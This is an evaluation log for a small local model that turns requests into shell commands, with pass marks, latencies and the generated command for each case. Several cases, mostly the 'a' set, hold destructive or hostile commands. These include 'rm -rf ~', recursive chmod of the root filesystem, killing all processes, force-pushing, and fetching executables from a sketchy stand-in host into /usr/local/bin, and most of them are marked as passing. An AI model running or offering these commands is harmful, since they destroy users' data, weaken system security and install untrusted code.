# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen3-1.7B-Q8_0.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 56/72 (78%)
- cold p50 2691ms p95 4767ms · warm p50 2517ms p95 4181ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 3283 | 3095 | node -v ; npm -v |
| u02 | ✓ | 2366 | 2439 | ls -l |
| u03 | ✓ | 2374 | 2475 | curl -s ifconfig.me |
| u04 | ✓ | 2760 | 2638 | lsof -i :3000 |
| u05 | ✓ | 2499 | 2300 | du -sh |
| u06 | ✗ | 2967 | 2866 | find |
| u07 | ✓ | 2588 | 2672 | ps -ef | grep node |
| u08 | ✓ | 4104 | 3358 | git status ; git branch |
| u09 | ✓ | 2420 | 2106 | brew install ripgrep |
| u10 | ✓ | 3415 | 3316 | mkdir -p projects ; cd projects |
| u11 | ✗ | 7052 | - | - |
| u12 | ✓ | 2655 | 3765 | env | grep PATH |
| u13 | ✓ | 2868 | 2728 | lsof -i :8080 | awk '{print $1}' | xargs kill -9 |
| u14 | ✓ | 2486 | 2323 | tail -n 20 /var/log/syslog |
| u15 | ✓ | 2262 | 2126 | python3 --version |
| u16 | ✓ | 2914 | 2848 | brew update ; brew outdated |
| u17 | ✗ | 3445 | 3279 | echo ; echo |
| u18 | ✓ | 2691 | 2415 | git reset --soft HEAD~1 |
| u19 | ✓ | 2804 | 2870 | du -ah --max-depth=1 /home/hridyaagrawal | sort -rh | head -n 5 |
| u20 | ✗ | 3253 | 3160 | ps -eo %cpu,%mem,rss,pid,cmd --sort -%mem | awk 'NR==1 {print $2  |
| u21 | ✗ | 3804 | 3752 | find ; wc |
| u22 | ✓ | 2114 | 2092 | brew services restart docker |
| u23 | ✓ | 3415 | 3065 | chmod +x script.sh ; ./script.sh |
| u24 | ✓ | 3666 | 3719 | grep -r 'TODO' /Users/hridyaagrawal/Honey/React/smartterminal/lexis --include='* |
| u25 | ✓ | 2506 | 2421 | curl -o "downloads/file.zip" https://example.com/file.zip |
| u26 | ✗ | 2934 | 2777 | lscpu ; nproc |
| u27 | ✓ | 2657 | 2656 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 2113 | 2128 | rm -rf node_modules |
| u29 | ✓ | 2151 | 2131 | netstat -tuln |
| u30 | ✓ | 2266 | 2217 | unzip file.zip |
| u31 | ✓ | 2454 | 2299 | tail -f /path/to/logfile.log |
| u32 | ✓ | 2204 | 2297 | uptime |
| u33 | ✓ | 2768 | 2517 | ls -1 ~/.zshrc ~/.zshrc.d ~/.zshenv ~/.zprofile ~/.zlogin ~/.zprofile.d |
| u34 | ✓ | 2100 | 1992 | cat /etc/resolv.conf |
| u35 | ✓ | 4132 | 3007 | cp file.txt backup.txt |
| u36 | ✗ | 4362 | 2440 | mv |
| u37 | ✓ | 2791 | 2599 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis/downloads |
| u38 | ✗ | 2135 | 2055 | npm list -g --global |
| u39 | ✗ | 2559 | 2665 | open -t /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u40 | ✓ | 2267 | 2121 | sudo dscacheutil -w |
| a01 | ✓ | 2164 | 2180 | rm -rf ~ |
| a02 | ✗ | 4691 | - | - |
| a03 | ✓ | 2413 | 2197 | git push -f main |
| a04 | ✓ | 2530 | 2424 | curl -fsSLo /usr/local/bin/install.sh https://sketchy.example.com/install.sh |
| a05 | ✓ | 2186 | 2072 | pkill -f "*" |
| a06 | ✗ | 4199 | 4321 | find / -type f -exec chmod 777 {} "; ; find / -type d -exec chmod 777 {} "; |
| a07 | ✓ | 2653 | 2490 | echo 'Your command here' > ~/.zshrc |
| a08 | ✓ | 4557 | 4434 | curl -fsSLo /usr/local/bin/installer https://x.io/i ; chmod +x /usr/local/bin/in |
| a09 | ✓ | 2470 | 2240 | sudo chmod -R 755 / |
| a10 | ✓ | 2769 | 2597 | find /var/log -type f -mtime +30 -exec rm -f {} "; |
| a11 | ✓ | 4269 | 4181 | crontab -e ; echo '*/1 * * * * /Users/hridyaagrawal/Honey/React/smartterminal/le |
| a12 | ✓ | 2217 | 2043 | git reset --hard HEAD~1 |
| a13 | ✓ | 2084 | 1935 | brew uninstall node |
| a14 | ✓ | 3220 | 3178 | sudo sysctl -w security.bootlimit=30 ; sudo launchd unload -r com.apple.BootLimi |
| a15 | ✗ | 4759 | - | - |
| a16 | ✗ | 4909 | - | - |
| a17 | ✓ | 2199 | 2259 | rm -rf /Users/hridyaagrawal |
| a18 | ✓ | 3113 | 3768 | gpg --symmetric --cipher-algo AES-256-CBC --passphrase 'hunter2' /Users/hridyaag |
| a19 | ✓ | 5989 | 5963 | echo 'export PATH=$HOME/.local/bin:$HOME/bin:$PATH' >> ~/.zshrc ; source ~/.zshr |
| a20 | ✗ | 4767 | - | - |
| u41 | ✗ | 2849 | 2691 | find |
| u42 | ✓ | 2517 | 2413 | echo 'hello world' > my notes.txt |
| u43 | ✓ | 2561 | 2624 | git log --oneline --reverse --max-count=5 |
| u44 | ✓ | 2400 | 2278 | curl -s https://example.com | less |
| u45 | ✓ | 2256 | 2325 | ls -1 | wc -l |
| u46 | ✓ | 2706 | 2628 | ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' |
| u47 | ✗ | 2206 | 2192 | df -h |
| u48 | ✓ | 2321 | 2151 | who |
| a21 | ✓ | 3938 | 4097 | crontab -l > /tmp/crontab.tmp ; echo "0 0 * * * rm -rf /tmp/*" | crontab - |
| a22 | ✓ | 2922 | 2647 | ln -s /Users/hridyaagrawal/.hosts /etc/hosts |
| a23 | ✓ | 2312 | 2428 | rm -rf * |
| a24 | ✓ | 4240 | 3810 | curl ; bash |
